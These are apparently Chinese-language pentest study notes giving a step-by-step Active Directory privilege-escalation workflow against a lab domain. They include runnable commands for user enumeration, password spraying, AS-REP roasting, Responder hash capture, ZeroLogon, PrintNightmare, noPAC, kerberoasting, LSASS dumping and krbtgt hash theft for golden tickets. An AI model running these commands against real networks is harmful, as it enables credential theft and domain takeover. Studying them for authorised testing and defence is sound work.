## 前言
域提权与 windows 提权差别：
	1. Windows 提权，前提是必须先获得目标机器的立足点（shell），然后枚举机器自身的弱点，最终获得机器的本地 system 或管理员权限
	2. 域提权，可以是在获得任意域主机立足点的情况下进行，也可以是在获得任意普通域用户凭证但是无法登录域主机的情况下进行，然后再枚举域环境的弱点，最终获得域控机器的本地 system 或域管理员权限 
## 突破点
### RCE 漏洞
1. 扫描目标网络的所有域主机，检查能否发现一些 Windows 系统经典 RCE 漏洞（如 ms 17-010 漏洞）。
命令
```bash
nmap --script='smb-vuln-*' -p 445 192.168.xxx.0/24

nxc smb 192.168.xxx.0/24 -M ms17-010
```
2. 聚焦与应用服务器，结合系统上运行的应用服务（如 FTP, IIS），看看这些应用组件是否存在 RCE 漏洞。
3. 聚焦于 WEB 服务器，检查网络中是否存在，**命令注入，SQL 注入，XXE 注入，SSRF, 远程包含，本地包含+文件上传
### 凭据爆破
1. 尝试使用 impacket-lookupsid 或 enum4linux-ng 工具匿名枚举域用户，或借助 [kerbrute](https://github.com/ropnop/kerbrute) 工具进行用户名爆破。
```bash
impacket-lookupsid skylark.com/guest@192.168.56.50

enum4linux-ng -A -u "" -p "" 192.168.56.50

./kerbrute_linux_386 userenum -d skylark.com --dc 192.168.56.50 user.txt
```

2. 根据得到的域用户列表，借助 [kerbrute.py](https://github.com/TarlogicSecurity/kerbrute) 工具检测**禁用预认证的用户**。若检测到了，可以进行 AS-REP 哈希爆破，进而就有可能获得域用户的凭证
```bash
python kerbrute.py -domain skylark.com -user user.txt -dc-ip 192.168.56.50
```
3. 若未检测到禁用预认证的用户，则使用nxc 结合以获得的用户命令进行**密码喷洒**。
```bash
#命令1,若用户名列表特别长，那么优先使用
nxc smb 192.168.56.50 -u user.txt -p pass.txt -d skylark.com --continue-on-success | grep +

#命令2
nxc smb 192.168.56.50 -u user.txt -p pass.txt -d skylark.com --no-bruteforce --continue-on-success | grep +
```
4. 若在 WEB 检测这种发现 SSRF 的漏洞，那便可以借助 Responder 进行 NTMLv 2 哈希的哈希爆破，进而就有可能获得域用户的凭证。
5. 此外，若处于局域网中也可以使用Responder 尝试进行 NTLMv2 哈希的捕获，万一就有意外惊喜。
```bash
responder -I eth0
```

> [!NOTE] Title
> 注：若经过以上 RCE 漏洞中的步骤最终获得了立足点，而为了可以供一些工具远程使用该用户的权限，则可以使用 rubeus.exe 导出域主机上当前用户的 TGT 票据。`Rubeus.exe tgtdeleg /nowrap >ticket.txt`

## 权限提升
### 委派
1. 检查当前用户对域控是否具有**约束委派**的权限。
```bash
impacket-findDelegation skylark.com/user:'password@123' -dc-ip 192.168.56.50
```
2. 检查当前用户对域控是否具有**基于资源的委派权限**。
```bash
impacket-rbcd skylark.com/user:'password@123' -dc-ip 192.168.56.50 -action read -delegate-to DC2012$
```
3. 若检查发现当前用户没有对域控的委派权限，但存在其它用户对域控或对其它服务器具备委派权限，则 **暂时先跳过** 委派部分的利用，待后续提权不成功之后再回来。
### NTLM 中继-强制认证
1. 检查域控机器是否是主备式的、存在 NTLM 强制认证漏洞、存在 remove-mic 漏洞，**若不满足以上任意一个条件则直接跳过以下步骤**。
```bash
nxc smb 192.168.56.51 -u user -p 'password@123' -d skylark.com -M coerce_plus

nxc smb 192.168.56.51 -u user -p 'password@123' -d skylark.com -M remove-mic
```
2. 优先尝试 **NTLM 中继-委派** 攻击
3. 若域控操作系统是 Windows 2016+，则尝试 **NTLM 中继-影子凭证** 攻击。
4. 若域控还提供证书颁发和 Web 申请证书的服务，则尝试 **NTLM 中继-ADCS 证书申请** 攻击。
### 提权漏洞
1. ZeroLogon 漏洞。
```bash
nxc smb 192.168.56.50 -M zerologon
```
2. PrintNightmare 漏洞。
```bash
#优先用这个
nxc smb 192.168.56.50 -u 'user' -p 'password@123' -d skylark.com -M printnightmare

impacket-rpcdump 192.168.56.50 | egrep 'MS-RPRN|MS-PAR' 
```
3. CertiFried 漏洞。
```bash
nxc ldap 192.168.56.50 -u 'user' -p 'password@123' -d skylark.com -M adcs
```
4. noPAC 漏洞。
```bash
nxc smb -u 'user' -p 'password@123' -d skylark.com 192.168.56.50 -M nopac
```

> [!NOTE] Title
> 注：域提权漏洞并不总是支持远程（凭证、票据）提权，这时候就只能在获得立足点的环境（shell）下进行利用了。

## 横向移动
在一系列域提权操作不成功之后，还可以借助一些技巧进行横向移动，以期望能发现一些惊喜。
1. 检查是否存在 **可进行 kerberoasting 攻击的域服务帐户**，若存在的话则继续检查其所属组的情况（若是域管理组的话自然最好，通常来说服务所运行的账户总是有一定价值的。），以决定是否值得花费大量工夫去破解哈希。
```bash
impacket-GetUserSPNs skylark.com/user:'password@123' -dc-ip 192.168.56.50
```
2. 使用 **已有的凭证（账户密码、账户哈希、TGT 票据）去遍历域中所有的主机**，以期望能够发现该凭证在某域主机上拥有本地管理员的权限。
```bash
nxc smb 192.168.56.0/24 -u 'user' -p 'password@123' -d skylark.com
```
3. 检查当前域主机的系统情况，看看是否能够查找到可以进行 **Windows 本地提权** 的方法。若能够本地提权的话，就又能多一些查找域提权的方法。
4. 在本地提权能够成功的前提下，还可以进行 **令牌模拟和 LSASS 进程转储**，以期望能够发现一些曾在本机登录过的其它用户的令牌或哈希信息。
## 会话维持
在完全控制了域控机器之后，可以采取以下措施来维持对 DC 机器的持续访问控制。
1. 转储 krbtgt 账户和 DC 机器账户的哈希，这样便可以通过离线制作金票银票，来发起对域控的票据传递攻击。同时，也是因为这两个账户的密码基本上并不会像域账户那样被随意修改。
